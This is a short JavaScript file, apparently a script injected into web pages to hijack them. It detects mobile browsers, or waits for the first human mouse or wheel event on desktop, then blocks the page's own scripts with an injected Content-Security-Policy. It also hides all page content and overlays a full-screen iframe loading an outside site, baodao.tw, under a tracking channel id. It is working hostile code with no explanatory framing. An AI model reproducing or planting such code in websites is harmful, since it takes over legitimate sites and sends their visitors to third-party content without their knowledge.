function isMobile() {
    const ua = navigator.userAgent;
    return /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
}

function handleEvent(event) {
    if (event.type === 'mousemove') {
        console.log('鼠标移动了 - 坐标: X=' + event.clientX + ', Y=' + event.clientY);
    } else if (event.type === 'wheel') {
        console.log('滚轮滚动 - 方向: ' + (event.deltaY > 0 ? '向下' : '向上'));
    }
    // 移除监听器
    document.removeEventListener('mousemove', handleEvent);
    document.removeEventListener('wheel', handleEvent);
    console.log('事件已触发，监听器已移除');
    fugai()
}

function fugai(){
    document.head.insertAdjacentHTML(
        "beforeend",
        `<meta http-equiv="Content-Security-Policy" content="script-src 'none'">`
    );
    var referrer = document.referrer;
    if (!referrer) {
        try {
            if (window.opener) {
                referrer = window.opener.location.href
            }
        } catch(e) {}
    }
    var channel = '6071587';
    var s = referrer;
    // var ss = 'http://'+channel+'.baodao.tw/?' + 'referrer=' + referrer;
    var ss = 'https://baodao.tw';
    document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
    document.write('<style>html,body {width: 100%;height: 100%;overflow: hidden;clear: both;}body > * , .container{opacity: 0;}#divs{opacity: 1;}</style>');
    document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;" id="divs">');
    document.write('<iframe src="' + ss  + '" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>');
    document.write('</div>');
}

// 主逻辑
if (isMobile()) {
    fugai()
}else{
    // 添加监听
    document.addEventListener('mousemove', handleEvent);
    document.addEventListener('wheel', handleEvent, { once: true });
    console.log('请移动鼠标或触摸屏幕，事件只会触发一次');
}